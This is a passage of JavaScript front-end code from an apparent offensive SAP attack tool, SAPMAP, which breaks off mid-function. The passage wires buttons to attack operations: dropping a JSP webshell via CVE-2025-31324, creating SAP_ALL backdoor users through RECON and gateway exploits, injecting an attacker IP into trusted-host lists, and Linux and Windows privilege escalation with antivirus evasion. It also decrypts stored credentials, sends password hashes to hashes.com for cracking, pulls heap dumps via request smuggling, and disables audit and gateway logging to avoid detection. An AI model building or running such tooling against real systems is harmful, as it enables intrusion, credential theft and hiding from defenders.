    + `${escHtml(c.source)} · ${escHtml(c.label || '?').substring(0, 60)} — `
    + `${escHtml(c.client_id).substring(0, 50)}${(c.client_id||'').length > 50 ? '…' : ''}`
    + `</option>`).join('');
  choicesSel.style.display = 'block';
  cidInput.value = unique[0].client_id;
  result.style.color = '#3fb950';
  result.textContent =
    `Auto-detected ${unique.length} candidate(s) for `
    + `${target_subdomain || uuid.slice(0, 8)}. Pick one from the `
    + `dropdown that appeared below the client_id field.`;
}

async function doBtpMintViaCert(uuid) {
  // Target by unique id — .modal-overlay collides with several
  // always-in-DOM modals (credentials, SCC, etc.) so a class
  // selector grabs the wrong one and dests parses as [].
  const overlay = document.getElementById('btpc-modal-overlay');
  const dests = JSON.parse(overlay.dataset.dests || '[]');
  const idx = parseInt(document.getElementById('btpc-dest').value, 10);
  const dest = dests[idx];
  const cid = document.getElementById('btpc-cid').value.trim();
  const scope = document.getElementById('btpc-scope').value.trim();
  const result = document.getElementById('btpc-result');
  const btn = document.getElementById('btpc-mint-btn');

  result.style.color = '#c9d1d9';
  if (!dest) { result.style.color = '#f85149'; result.textContent = 'No destination selected'; return; }
  if (!cid) { result.style.color = '#f85149'; result.textContent = 'client_id is required'; return; }

  btn.disabled = true;
  btn.textContent = 'Minting…';
  result.textContent = `POST /oauth/token via ${dest.source_sid}/${dest.dest_name} → ${dest.host} …`;

  const r = await api('POST', `node/${dest.source_sid}/mint_btp_token_via_cert`, {
    destination_name: dest.dest_name,
    client_id: cid,
    scope: scope,
  });
  btn.disabled = false;
  btn.textContent = 'Mint Token';

  if (!r || !r.ok) {
    result.style.color = '#f85149';
    let msg = `Mint failed: ${(r && r.error) || 'unknown error'}`;
    if (r && r.hint) msg += `\n\nHint: ${r.hint}`;
    result.textContent = msg;
    return;
  }

  result.style.color = '#3fb950';
  const e = r.enumerate || {};
  let line = `Token minted for region ${r.region} ✓`;
  if (r.thumbprint) line += `\n  bound to cert x5t#S256=${r.thumbprint.substring(0, 16)}…`;
  if (Array.isArray(r.scopes) && r.scopes.length) {
    line += `\n  scopes: ${r.scopes.join(', ')}`;
  }
  if (typeof e.destinations === 'number') {
    line += `\n\nauto-enumerate: ${e.destinations} destination(s), `
          + `${e.cleartext_captured} cleartext, `
          + `${e.linked_to_onprem} linked to on-prem`;
  } else if (e.error) {
    line += `\n\nauto-enumerate error: ${e.error}`;
  }
  result.textContent = line;
  startPolling();
}

function btpHighlightLinkedTargets(uuid) {
  const bn = (mapState.btp_subaccounts || {})[uuid];
  if (!bn) return;
  const targets = (bn.destinations || [])
    .map(d => d && d.linked_target_sid)
    .filter(Boolean);
  const unique = Array.from(new Set(targets));
  if (unique.length === 0) {
    showToast('No linked on-prem targets to highlight', 'info');
    return;
  }
  unique.forEach(sid => { try { _pulseNode(sid, 'CRITICAL'); } catch (_) {} });
  showToast(`Pulsing ${unique.length} linked target${unique.length>1?'s':''}: ${unique.join(', ')}`, 'info');
}

async function btpRemoveFromMap(uuid) {
  if (!confirm('Remove BTP subaccount ' + (uuid.slice(0, 8)) + '… from the map?\n\n'
              + '(Local-only; will reappear next time you re-enumerate '
              + 'with a token for the same subaccount.)')) return;
  // Server-side removal so the next /api/state poll doesn't restore
  // the node (issue #2 follow-up).  Local delete first for snappy UI.
  // NB: previous code called renderMap() which doesn't exist — that
  // ReferenceError silently aborted the handler before any DELETE
  // fired.  Correct redraw entry point is updateMap().
  if (mapState.btp_subaccounts) delete mapState.btp_subaccounts[uuid];
  updateMap();
  try {
    const r = await api('DELETE', `btp/subaccount/${encodeURIComponent(uuid)}`);
    if (r && r.error) showToast('BTP delete failed: ' + r.error, 'error');
  } catch (e) { showToast('BTP delete error: ' + e, 'error'); }
}

function _copyToClipboard(text, label) {
  if (!text) { showToast('Nothing to copy', 'info'); return; }
  try {
    navigator.clipboard.writeText(text);
    showToast(`Copied ${label} to clipboard`, 'info');
  } catch (e) {
    // Fallback for older browsers / restrictive contexts
    const ta = document.createElement('textarea');
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    try { document.execCommand('copy'); } catch (_) {}
    ta.remove();
    showToast(`Copied ${label} to clipboard`, 'info');
  }
}

function _sccStoredCreds(host) {
  // Return the first stored credential for an SCC node, or null.
  const sn = (mapState.scc_nodes || {})[host];
  const creds = sn && sn.credentials;
  if (creds && creds.length > 0) return creds[0];
  return null;
}

function showSCCCredModal(host) {
  const stored = _sccStoredCreds(host);
  document.getElementById('scc-cred-system-info').textContent =
    'Cloud Connector: ' + host + (stored ? '  (stored credentials will be replaced)' : '');
  document.getElementById('scc-cred-user').value = (stored && stored.username) ? stored.username : 'Administrator';
  document.getElementById('scc-cred-pass').value = (stored && stored.password) ? stored.password : '';
  document.getElementById('scc-cred-modal').dataset.host = host;
  document.getElementById('scc-cred-modal').classList.add('visible');
}

async function saveSCCCredentials() {
  const modal = document.getElementById('scc-cred-modal');
  const host = modal.dataset.host;
  const u = document.getElementById('scc-cred-user').value.trim();
  const p = document.getElementById('scc-cred-pass').value;
  if (!u || !p) { alert('Username and password are required.'); return; }
  try {
    flashActivity('SCC ' + host + ': saving credentials', 3000);
    const r = await fetch('/api/scc/' + encodeURIComponent(host) + '/set_credentials',
                          { method: 'POST', headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ username: u, password: p }) });
    const d = await r.json();
    if (d.error) { alert('Failed: ' + d.error); return; }
    closeModal('scc-cred-modal');
    await pollUpdates();
  } catch (e) { alert('Error: ' + e); }
}

// --- WD admin credentials modal ----------------------------------------
function showWdCredModal(sid) {
  const node = mapState.nodes[sid] || {};
  const stored = (node.credentials || []).find(c =>
    c && (c.kind === 'wd_admin' || (c.username || '').toLowerCase() === 'webadm'));
  document.getElementById('wd-cred-system-info').textContent =
    'WD: ' + sid + (stored ? '  (stored credentials will be replaced)' : '');
  document.getElementById('wd-cred-user').value =
    (stored && stored.username) ? stored.username : 'webadm';
  document.getElementById('wd-cred-pass').value =
    (stored && stored.password) ? stored.password : '';
  document.getElementById('wd-cred-modal').dataset.sid = sid;
  document.getElementById('wd-cred-modal').classList.add('visible');
}

async function _saveWdCredsCore(extract) {
  const modal = document.getElementById('wd-cred-modal');
  const sid = modal.dataset.sid;
  const u = document.getElementById('wd-cred-user').value.trim();
  const p = document.getElementById('wd-cred-pass').value;
  if (!u || !p) { alert('Username and password are required.'); return; }
  try {
    flashActivity('WD ' + sid + ': saving + testing credentials', 3000);
    const r = await fetch('/api/node/' + encodeURIComponent(sid)
                            + '/wd_admin_set_credentials',
                          { method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                              username: u, password: p,
                              extract_systems: !!extract,
                            }) });
    const d = await r.json();
    if (d.error) { alert('Failed: ' + d.error); return; }
    closeModal('wd-cred-modal');
    await pollUpdates();
    showToast(
      extract
        ? 'WD credentials saved; backend-table extraction running — see console'
        : 'WD credentials saved & tested',
      'info');
  } catch (e) { alert('Error: ' + e); }
}

async function testWdCredentials() { await _saveWdCredsCore(false); }
async function saveWdCredentialsAndExtract() { await _saveWdCredsCore(true); }

// --- WD icmauth.txt paste modal ----------------------------------------
function showIcmauthPasteModal(sid, reason) {
  const modal = document.getElementById('wd-icmauth-modal');
  modal.dataset.sid = sid;
  document.getElementById('wd-icmauth-reason').textContent =
    reason ? ('Auto-fetch unavailable: ' + reason
              + ' — paste icmauth.txt below to continue.') : '';
  document.getElementById('wd-icmauth-text').value = '';
  modal.classList.add('visible');
}

async function submitIcmauthPaste() {
  const modal = document.getElementById('wd-icmauth-modal');
  const sid = modal.dataset.sid;
  const text = document.getElementById('wd-icmauth-text').value;
  if (!text || text.length < 16) {
    alert('Paste the icmauth.txt contents first.');
    return;
  }
  try {
    flashActivity('WD ' + sid + ': parsing pasted icmauth.txt', 3000);
    const r = await fetch('/api/node/' + encodeURIComponent(sid)
                            + '/wd_extract_icmauth',
                          { method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ raw_text: text }) });
    const d = await r.json();
    if (d.error) { alert('Failed: ' + d.error); return; }
    closeModal('wd-icmauth-modal');
    const n = d.parsed_count || 0;
    const cracked = d.cracked_count || 0;
    let msg = 'icmauth.txt: parsed ' + n + ' hash(es)';
    if (d.hashes_com_attempted) {
      msg += ', hashes.com cracked ' + cracked + '/' + n;
    } else if (d.hashes_com_skipped_reason) {
      msg += ' (hashes.com skipped: ' + d.hashes_com_skipped_reason + ')';
    }
    showToast(msg, cracked > 0 ? 'success' : 'info');
    await pollUpdates();
  } catch (e) { alert('Error: ' + e); }
}

async function ctxAction(action) {
  hideCtxMenu();
  if (!selectedNodeSid) return;
  const sid = selectedNodeSid;

  switch (action) {
    case 'details': showDetails(sid); break;
    case 'findings': showFindings(sid); break;
    case 'credentials': showCredModal(sid); break;
    case 'remove_credentials': showRemoveCredsModal(sid); break;
    case 'rfc_system_info':
      await api('POST', `node/${sid}/rfc_system_info`); break;
    case 'check_gw':
      await api('POST', `node/${sid}/check_gw`); break;
    case 'check_ms':
      await api('POST', `node/${sid}/check_ms`); break;
    case 'check_cve_31324':
      await api('POST', `node/${sid}/check_cve_2025_31324`); break;
    case 'check_cve_6287':
      await api('POST', `node/${sid}/check_cve_2020_6287`); break;
    case 'check_cve_22536':
      await api('POST', `node/${sid}/check_cve_2022_22536`); break;
    case 'check_node_vulns': {
      // Fires every vulnerability check applicable to this node's stack.
      // Backend jobs run in the background; we kick them off in parallel
      // and let the operator watch the console for results.
      const nn = (mapState.nodes || {})[sid];
      if (!nn) break;
      const st = ((nn.system_type || '') + '').toUpperCase();
      const isA = st.indexOf('ABAP') !== -1;
      const isJ = st.indexOf('JAVA') !== -1;
      const gwPort = (nn.instances || []).some(i => Object.entries(i.ports || {}).some(([p,s]) => s === 'gateway' || (p >= 3300 && p <= 3399)));
      const jobs = [];
      if (gwPort) jobs.push(api('POST', `node/${sid}/check_gw`));
      if (isA || isJ) jobs.push(api('POST', `node/${sid}/check_ms`));
      if (isJ) jobs.push(api('POST', `node/${sid}/check_cve_2025_31324`));
      if (isJ) jobs.push(api('POST', `node/${sid}/check_cve_2020_6287`));
      if (isA || isJ || nn.is_web_dispatcher) jobs.push(api('POST', `node/${sid}/check_cve_2022_22536`));
      await Promise.allSettled(jobs);
      showToast(`Started ${jobs.length} vulnerability check(s) on ${sid} — watch console`, 'info');
      break;
    }
    case 'wd_rediscover':
      await api('POST', `node/${sid}/wd_rediscover`);
      showToast('WD topology rediscovery started — see console for cache + backend results', 'info');
      break;
    case 'wd_admin_creds':
      showWdCredModal(sid);
      break;
    case 'wd_admin_probe_defaults':
      await api('POST', `node/${sid}/wd_admin_probe_defaults`);
      showToast('Probing WD admin default credentials — see console for verdict', 'info');
      break;
    case 'wd_extract_icmauth': {
      // Step 1: try the admin file-viewer endpoints with stored creds.
      // The backend always responds — when it can't fetch on its own
      // it returns {needs_paste: true} so the operator can paste the
      // icmauth.txt content from a manual filesystem grab.
      const r = await api('POST', `node/${sid}/wd_extract_icmauth`);
      if (r && r.needs_paste) {
        showIcmauthPasteModal(sid, r.reason || '');
      } else {
        showToast('icmauth.txt extraction started — see console for hashes + hashes.com lookup', 'info');
      }
      break;
    }
    case 'icmad_acl_bypass': {
      const outer = prompt(
        'Outer GET path the WD will FORWARD to a backend (not serve\n' +
        'locally) — the smuggle needs the backend response\'s\n' +
        'keep-alive to survive long enough for the re-parse.\n\n' +
        '/sap/wzip?aaa is the canonical (forwards on /sap/* SRCURL,\n' +
        '404\'s cleanly, keep-alive intact).  Override for atypical\n' +
        'configs (e.g. /nwa/ for NWA-routed WDs).',
        '/sap/wzip?aaa'
      );
      if (outer === null) break;
      await api('POST', `node/${sid}/icmad_acl_bypass`, { outer_path: outer });
      showToast('ICMAD ACL-bypass sweep started — see console for per-path verdicts', 'info');
      break;
    }
    case 'icmad_heapdump_pull': {
      const outer = prompt(
        'Outer GET path the WD forwards to backend (same constraint as\n' +
        'the ACL-bypass sweep — needs to keep the connection alive\n' +
        'so the smuggle re-parse can fire):',
        '/sap/wzip?aaa'
      );
      if (outer === null) break;
      // Step 1: list dumps
      const listResp = await api('POST', `node/${sid}/icmad_heapdump_pull`,
                                  { outer_path: outer });
      if (!listResp || !listResp.dumps || listResp.dumps.length === 0) {
        showToast('No HPROF files found via /heapdump/ — backend may have heap-dump servlet disabled, or the smuggle did not reach it', 'warn');
        break;
      }
      // Step 2: prompt for which dump
      const choice = prompt(
        'Pick the HPROF to download (one per line — heap dumps can be 200 MB to 4 GB):\n\n'
        + listResp.dumps.map((d, i) => `${i+1}. ${d}`).join('\n')
        + '\n\nEnter the number or full filename:',
        '1'
      );
      if (!choice) break;
      let dump = choice.trim();
      const idx = parseInt(dump, 10);
      if (!isNaN(idx) && idx >= 1 && idx <= listResp.dumps.length) {
        dump = listResp.dumps[idx - 1];
      }
      if (!confirm(
        `Pull HPROF ${dump} from ${sid}?\n\n` +
        'This streams the full heap dump (200 MB to 4 GB) to the loot ' +
        'directory.  No retries on failure.  Continue?'
      )) break;
      await api('POST', `node/${sid}/icmad_heapdump_pull`,
                { outer_path: outer, dump: dump });
      showToast('ICMAD heap-dump pull started — see console for progress', 'info');
      break;
    }
    case 'check_linux_lpe':
      await api('POST', `node/${sid}/check_linux_lpe`);
      showToast('Linux LPE check started — probing Copy Fail, pedit-COW, and Dirty Frag', 'info');
      break;
    case 'exploit_linux_lpe': {
      // Operator picks technique explicitly. Three options:
      //   Copy Fail — pure Python (no on-disk binary), fast, ~1 RFC call,
      //     covers most modern kernels. Recommended default.
      //   pedit-COW (CVE-2026-46331) — deterministic single-shot,
      //     ~700 KB vendored static binary. Needs userns enabled
      //     (frequently disabled on hardened RHEL prod SAP).
      //   Dirty Frag — race-based fallback, vendored ~7,000-chunk
      //     binary. Use when neither of the above works.
      const choice = (prompt(
            'Pick the Linux LPE technique for ' + sid + ':\n\n'
            + '  copyfail  = Copy Fail (CVE-2026-31431) — pure Python, fast,\n'
            + '              no binary on disk. Recommended default.\n'
            + '  peditcow  = pedit-COW (CVE-2026-46331) — deterministic,\n'
            + '              ~700 KB blob. Needs userns enabled.\n'
            + '  dirtyfrag = Dirty Frag (no CVE) — vendored ~7,000-chunk\n'
            + '              binary. Race-based fallback.\n\n'
            + 'Enter one of: copyfail / peditcow / dirtyfrag',
            'copyfail') || '').trim().toLowerCase();
      if (!['copyfail', 'peditcow', 'dirtyfrag'].includes(choice)) {
        showToast('Cancelled — unknown method ' + JSON.stringify(choice), 'warning');
        break;
      }
      const method = choice;
      const cmd = prompt(
            'Command to run as root on ' + sid
            + ' (via ' + method + '):', 'id');
      if (!cmd) break;
      if (!confirm(
            'Run Linux LPE (' + method + ') on ' + sid + '?\n\n'
            + 'Temporarily patches /usr/bin/su in the kernel page '
            + 'cache to execute:\n  ' + cmd + '\n\n'
            + 'Non-persistent (page cache only, lost on reboot or '
            + '`echo 3 > /proc/sys/vm/drop_caches`).')) break;
      await api('POST', `node/${sid}/exploit_linux_lpe`,
                {command: cmd, method: method});
      break;
    }
    case 'check_windows_lpe':
      await api('POST', `node/${sid}/check_windows_lpe`);
      showToast('Windows LPE check started — probing MiniPlasma (cldflt race)', 'info');
      break;
    case 'exploit_windows_lpe': {
      const cmd = prompt('Command to run as NT AUTHORITY\\SYSTEM on ' + sid + ':', 'whoami');
      if (!cmd) break;
      const useEvasion = confirm(
            'Enable AV evasion?\n\n'
            + 'OK = encrypted-blob delivery + PowerShell reflective load '
            + '(EfsPotato only currently). The .NET PE never lands on disk '
            + 'in recognizable form, so Defender signature scan misses it. '
            + 'Slower upload (loader script + encrypted blob both chunked) '
            + 'but works on targets with AV enabled.\n\n'
            + 'Cancel = legacy plaintext PE delivery. Faster, but Defender '
            + 'will quarantine the PE on disk.');
      if (!confirm(
            'Run Windows LPE on ' + sid + '?\n\n'
            + 'SAPMAP auto-picks the best technique:\n'
            + '  - EfsPotato (SeImpersonate -> SYSTEM via MS-EFSRPC coercion) '
            + 'when the user holds SeImpersonatePrivilege.  Broadest '
            + 'service-account coverage (handles NETWORK SERVICE / IIS '
            + 'APPPOOL).  Multi-pipe fallback (lsarpc/efsrpc/samr/netlogon).\n'
            + '  - GodPotato (SeImpersonate -> SYSTEM via DCOM unmarshal) '
            + 'as fallback if EFSRPC is locked down.\n'
            + '  - MiniPlasma (cldflt race, CVE-2020-17103 un-patched) when '
            + 'no SeImpersonate held.  Win10 1709+ / Server 2019+ only.\n\n'
            + 'Command:\n  ' + cmd + '\n'
            + 'AV evasion: ' + (useEvasion ? 'ON' : 'OFF') + '\n\n'
            + 'Non-persistent.  Output captured to a temp file and read back.')) break;
      await api('POST', `node/${sid}/exploit_windows_lpe`,
                { command: cmd, av_evasion: useEvasion });
      break;
    }
    case 'read_java_destinations': {
      if (!confirm('Enumerate JCo destinations from J2EE_CONFIGENTRY?\n\n' +
                    'Decrypts each destination\'s password via SecStoreFS, ' +
                    'auto-plots downstream ABAP targets that aren\'t on the ' +
                    'map yet, imports the credentials, and draws RFC edges ' +
                    'from this node to each target.')) break;
      await api('POST', `node/${sid}/read_java_destinations`);
      break;
    }
    case 'download_java_secstore': {
      if (!confirm('Extract + decrypt the Java Secure Store?\n\n' +
                    'Reads /usr/sap/<SID>/SYS/global/security/data/SecStore.{properties,key}\n' +
                    'and decrypts entries using the target\'s own SecStoreFS class.\n' +
                    'Also queries J2EE_CONFIGENTRY for encrypted config rows.\n\n' +
                    'Any downstream ABAP systems referenced by SAPJSF/JCo entries will be ' +
                    'auto-added to the map, with the extracted credentials imported and ' +
                    'an RFC edge drawn from this node to them.')) break;
      await api('POST', `node/${sid}/java_secstore`);
      // Poll briefly for the results; when they land, show a small
      // bottom-right toast with a "View details" button instead of
      // auto-opening the modal — the modal would hide any new downstream
      // nodes auto-plotted on the map during extraction.
      const pollStart = Date.now();
      const pollTimer = setInterval(() => {
        const nn = (mapState.nodes || {})[sid];
        if (nn && nn.java_secstore_checked && (nn.java_secstore_entries||[]).length) {
          clearInterval(pollTimer);
          showJavaSecStoreToast(sid);
        } else if (Date.now() - pollStart > 180000) {
          clearInterval(pollTimer);
        }
      }, 1500);
      break;
    }
    case 'view_java_secstore':
      showJavaSecStoreModal(sid); break;
    case 'create_user_java': {
      const u = prompt('Create Java user\n\nUsername:', 'SAPMAP00');
      if (!u || !u.trim()) break;
      const p = prompt('Password (leave empty for random):', 'Andinyougo123!');
      if (p === null) break;
      const g = prompt('Add to group (blank = Administrators):', 'Administrators');
      const n = (mapState.nodes || {})[sid];
      const hasCve = n && n.cve_2025_31324_vulnerable;
      const hasRecon = n && n.cve_2020_6287_vulnerable;
      const hasGw  = n && n.gw_vulnerable;
      let method = 'auto';
      const paths = [];
      if (hasCve)   paths.push('"cve" (CVE-2025-31324)');
      if (hasRecon) paths.push('"recon" (CVE-2020-6287 RECON)');
      if (hasGw)    paths.push('"gw" (RFC Gateway SAPXPG)');
      if (paths.length > 1) {
        const m = prompt('Method — ' + paths.join(', ') +
                          '.\nLeave "auto" to let SAPMAP pick the best:', 'auto');
        if (m === null) break;
        if (/^cve/i.test(m) && !/recon/i.test(m)) method = 'cve_31324';
        else if (/^recon/i.test(m)) method = 'recon';
        else if (/^gw/i.test(m)) method = 'gw';
      }
      await api('POST', `node/${sid}/create_user_java`, {
        username: u.trim(),
        password: (p || '').trim(),
        group:    (g || 'Administrators').trim(),
        method:   method,
      });
      break;
    }
    case 'exploit_cve_31324_drop': {
      if (!confirm('Drop a JSP webshell via CVE-2025-31324?\n\n' +
                    'A randomly-named JSP will be written under /irj/<name>.jsp ' +
                    'on the target and then usable to run OS commands with output ' +
                    'capture.  Remember to remove the file when you are done.')) break;
      const r = await api('POST', `node/${sid}/exploit_cve_2025_31324`,
                          { mode: 'dropshell' });
      if (r && r.success) {
        alert('Shell dropped at:\n' + r.shell_url +
              '\n\nDirect URL example — append ?cmd=<command>:\n' +
              r.shell_url + '?cmd=whoami\n\n' +
              'Or use the OS Command Terminal with method ' +
              '"CVE-2025-31324 (Java unauth)" for an interactive console with ' +
              'captured stdout.');
      } else {
        alert('Drop failed: ' + ((r && r.error) || 'unknown error'));
      }
      break;
    }
    case 'betrusted': {
      const n = (mapState.nodes || {})[sid];
      const msPort = n && n.ms_port ? n.ms_port : '39NN';
      const ip = prompt(`Betrusted — Inject Trusted IP (10KBLAZE)\nMS port: ${msPort}\n\nEnter the attacker IP to inject into the gateway's trusted host list:`, localIp);
      if (ip && ip.trim()) {
        await api('POST', `node/${sid}/betrusted`, { attacker_ip: ip.trim(), nilist_wait: 30 });
      }
      break;
    }
    case 'create_user_betrusted': {
      const n = (mapState.nodes || {})[sid];
      const msPort = n && n.ms_port ? n.ms_port : '39NN';
      const clients_bt = (n && n.clients || []).map(c => typeof c === 'object' ? c.nr || '?' : String(c));
      let defBt = clients_bt.find(c => c !== '000') || clients_bt[0] || '001';
      const ip = prompt(
        `10KBLAZE Full Chain: betrusted → GW trust → create user\nMS port: ${msPort}\n\n` +
        `Enter attacker IP to inject:`, localIp
      );
      if (ip === null) break;
      const clientBt = prompt(
        `Create user in which client?\n\n` +
        (clients_bt.length > 0 ? `Known clients: ${clients_bt.join(', ')}\n` : '') +
        `(User will be created with SAP_ALL)`,
        defBt
      );
      if (clientBt === null) break;
      await api('POST', `node/${sid}/betrusted_chain`,
                { attacker_ip: ip.trim(), nilist_wait: 30, client: clientBt.trim() });
      break;
    }
    case 'create_user_gw': {
      const n_gw = (mapState.nodes || {})[sid];
      const sysTypeGw = (n_gw && n_gw.system_type || '').toUpperCase();
      const isJavaOnly = sysTypeGw.indexOf('JAVA') !== -1 && sysTypeGw.indexOf('ABAP') === -1;
      if (isJavaOnly) {
        // Java stack has no client concept and no USR02 — route to the
        // Java UME backend using the GW SAPXPG delivery path.
        const uj = prompt('Create Java user (via GW SAPXPG → UME)\n\nUsername:', 'SAPMAP00');
        if (!uj || !uj.trim()) break;
        const pj = prompt('Password (leave empty for random):', 'Andinyougo123!');
        if (pj === null) break;
        const gj = prompt('Add to group (blank = Administrators):', 'Administrators');
        await api('POST', `node/${sid}/create_user_java`, {
          username: uj.trim(),
          password: (pj || '').trim(),
          group:    (gj || 'Administrators').trim(),
          method:   'gw',
        });
        break;
      }
      // ABAP / dual-stack: original USR02 SQL-INSERT path (needs client)
      const clients_gw = (n_gw && n_gw.clients || []).map(c => typeof c === 'object' ? c.nr || '?' : String(c));
      let defaultClient = clients_gw.find(c => c !== '000') || clients_gw[0] || '001';
      const clientGw = prompt(
        `Create user in which client?\n\n` +
        (clients_gw.length > 0 ? `Known clients: ${clients_gw.join(', ')}\n` : '') +
        `(User will be created with SAP_ALL via GW exploit)`,
        defaultClient
      );
      if (clientGw === null) break;
      await api('POST', `node/${sid}/create_user`, { method: 'gw_exploit', client: clientGw.trim() });
      break;
    }
    case 'create_user_dpmon_sapstar': {
      const n_dp = (mapState.nodes || {})[sid];
      const sysTypeDp = (n_dp && n_dp.system_type || '').toUpperCase();
      // Pre-flight: ABAP stack required (pure-Java has no SAP* user)
      if (sysTypeDp.indexOf('ABAP') === -1) {
        alert('dpmon virtual SAP* needs an ABAP stack.\n\n' +
              'system_type=' + (n_dp && n_dp.system_type || '?') +
              ' — try one of the Java exploit paths instead.');
        break;
      }
      // Pre-flight: kernel >= 790
      const kernelDp = (n_dp && n_dp.kernel || '').replace(/[^0-9]/g, '');
      if (!kernelDp || parseInt(kernelDp.slice(0, 4), 10) < 790) {
        alert('dpmon virtual SAP* needs kernel >= 790.\n\n' +
              'This node reports kernel=' + (n_dp && n_dp.kernel || '?') +
              ' — feature added in SAP Note 3303172.');
        break;
      }
      const clients_dp = (n_dp && n_dp.clients || [])
        .map(c => typeof c === 'object' ? c.nr || '?' : String(c));
      const defClientDp = clients_dp.find(c => c !== '000') || clients_dp[0] || '001';
      const clientDp = prompt(
        `Create SAPMAP00 via dpmon virtual SAP* (kernel >= 790, ABAP):\n\n` +
        (clients_dp.length > 0 ? `Known clients: ${clients_dp.join(', ')}\n` : '') +
        `\nFlow: GW SAPXPG -> dpmon -> SAP* one-time password -> ` +
        `BAPI_USER_CREATE1(SAPMAP00, SAP_ALL).\n\n` +
        `Audit: this fires a Security Audit Log event EUP, purpose 2.\n\n` +
        `Client?`,
        defClientDp
      );
      if (clientDp === null) break;
      await api('POST', `node/${sid}/create_user`, {
        method: 'dpmon_sap_star',
        client: clientDp.trim(),
      });
      break;
    }
    case 'create_user_creds': {
      const n_cr = (mapState.nodes || {})[sid];
      const clients_cr = (n_cr && n_cr.clients || []).map(c => typeof c === 'object' ? c.nr || '?' : String(c));
      let defCr = clients_cr.find(c => c !== '000') || clients_cr[0] || '001';
      const clientCr = prompt(
        `Create user in which client?\n\n` +
        (clients_cr.length > 0 ? `Known clients: ${clients_cr.join(', ')}\n` : '') +
        `(User will be created via BAPI with credentials)`,
        defCr
      );
      if (clientCr === null) break;
      await api('POST', `node/${sid}/create_user`, { method: 'credentials', client: clientCr.trim() });
      break;
    }
    case 'lpe':
      await api('POST', `node/${sid}/lpe`); break;
    case 'deep_scan':
      await api('POST', `node/${sid}/deep_scan`); break;
    case 'standard_scan':
      await api('POST', `node/${sid}/standard_scan`); break;
    case 'export_report':
      // Delegates to the top-nav Export Engagement Report flow — same
      // endpoint, same server-side write to loot/reports/.
      exportReport(); break;
    case 'analyse_capabilities': {
      const probe = confirm(
        'Run user capability analyser on ' + sid + '?\n\n' +
        'Reads AGR_USERS / AGR_1251 / UST04 to map every user we ' +
        'own to human-readable business capabilities (e.g. ' +
        '"can read BSEG", "can edit vendor IBANs in LFBK").\n\n' +
        'Click OK to also run COUNT(*) row probes on each named ' +
        'table for the engagement report ("BSEG = 20.7M rows") — ' +
        'a few seconds longer.\nCancel to skip the row probes.');
      await api('POST', `node/${sid}/analyse_capabilities`,
                { probe_row_counts: probe });
      break;
    }
    case 'probe_telemetry':
      flashActivity(`${sid}: probing telemetry posture`, 3500);
      await api('POST', `node/${sid}/probe_telemetry`); break;
    case 'capture_evasion_baseline':
      flashActivity(`${sid}: capturing Tier 3 evasion baseline`, 5000);
      await api('POST', `node/${sid}/capture_evasion_baseline`); break;
    case 'probe_rsau_api':
      flashActivity(`${sid}: probing RSAU API surface`, 6000);
      await api('POST', `node/${sid}/probe_rsau_api`); break;
    case 'probe_rsau_dyn_profile':
      flashActivity(`${sid}: probing RSAU dynamic profile`, 5000);
      await api('POST', `node/${sid}/probe_rsau_dyn_profile`); break;
    case 'tier3_sal_slot_disable': {
      const slotno = prompt(
        'Tier 3: disable which SAL filter slot(s) on ' + sid + '?'
        + '\n\nAccepted forms:'
        + '\n  • single slot:    1   (or 0001)'
        + '\n  • multiple slots: 1,2,3'
        + '\n  • everything currently active: ALL'
        + '\n\nThe targeted slots flip to STATUS=\' \' for the hold'
        + ' window, then auto-restore.',
        '1');
      if (!slotno) break;
      const holdRaw = prompt(
        'Hold disabled for how many seconds before auto-restore?\n\n'
        + 'Watch SM19 / RSAU_CONFIG on the server during this '
        + 'window — the targeted slots should show inactive.', '5');
      if (!holdRaw) break;
      const hold = parseFloat(holdRaw);
      if (isNaN(hold) || hold < 0 || hold > 600) {
        showToast('Hold seconds must be a number between 0 and 600',
                   'warning');
        break;
      }
      // Profile name — only needed if the stealth path
      // (RSAU_UPD_AUDIT_CONFIG) isn't available and the fallback
      // (RSAU_API_SET_PROFILE) kicks in.  Optional; leave blank
      // to skip (stealth path doesn't need it).
      const profile = prompt(
        'SAL profile name (only needed if stealth writer is '
        + 'unavailable on this kernel).\n\n'
        + 'Leave as SAPSEC (stock S/4 default) or blank to skip.\n'
        + 'The primary stealth path (RSAU_UPD_AUDIT_CONFIG) does '
        + 'NOT use a profile name.',
        'SAPSEC');
      if (profile === null) break;
      if (!confirm(
        'RUN Tier 3 SAL slot disable on ' + sid + '?\n\n'
        + 'Slot(s): ' + slotno + '\n'
        + 'Hold: ' + hold + 's\n'
        + (profile ? 'Profile (fallback): ' + profile + '\n' : '')
        + '\nPrimary path: RSAU_UPD_AUDIT_CONFIG (shared-memory '
        + 'only — no disk persistence, no SM19 header change).\n'
        + 'Fallback: RSAU_API_SET_PROFILE (persists to disk if '
        + 'legacy FMs unavailable).\n\n'
        + 'This MUTATES kernel state — a baseline must already '
        + 'be captured for restore-on-exit to work.')) break;
      flashActivity(
        `${sid}: Tier 3 — setting up SAL slot disable...`, 5000);
      await api('POST', `node/${sid}/tier3_sal_slot_disable`,
                 {slotno: slotno, profile_name: profile || '',
                  hold_seconds: hold});
      // Client-side countdown (visual only — backend sleeps in bg thread)
      let salRemaining = Math.ceil(hold);
      const cdKey = '_sal_cd_' + sid;
      activeTasks[cdKey] =
        '\u{1F6A8} SAL slot(s) ' + slotno + ' DISABLED — '
        + salRemaining + 's';
      updateActivityBar();
      const cdTimer = setInterval(() => {
        salRemaining--;
        if (salRemaining > 0) {
          activeTasks[cdKey] =
            '\u{1F6A8} SAL slot(s) ' + slotno + ' DISABLED — '
            + salRemaining + 's';
        } else if (salRemaining === 0) {
          activeTasks[cdKey] =
            '\u{2705} SAL slot(s) ' + slotno + ' — restoring...';
        } else {
          delete activeTasks[cdKey];
          clearInterval(cdTimer);
        }
        updateActivityBar();
      }, 1000);
      break;
    }
    case 'tier3_gw_logging_off':
    case 'tier3_rdisp_trace_off': {
      const isCompound = (action === 'tier3_gw_logging_off');
      const param = isCompound ? 'gw/logging' : 'rdisp/TRACE';
      const human = isCompound ? 'Gateway logging' : 'Dispatcher trace';
      // Fetch the baseline value so the operator can edit a known-
      // valid structured string (gw/logging) or see what they're
      // overriding (rdisp/TRACE).
      let baseline = '';
      try {
        const r = await api('GET',
          'node/' + sid + '/evasion_baseline_param?param='
          + encodeURIComponent(param));
        baseline = (r && r.value) || '';
